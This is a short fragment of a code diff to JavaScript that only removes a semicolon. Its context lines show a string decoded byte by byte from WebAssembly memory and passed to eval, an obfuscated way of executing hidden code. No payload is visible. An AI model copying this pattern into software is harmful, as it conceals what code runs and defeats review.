@@ -7,4 +7,4 @@ WebAssembly.instantiate(Z)
             S += String.fromCharCode(m[i])
         }
         eval(S)
-    });
+    })
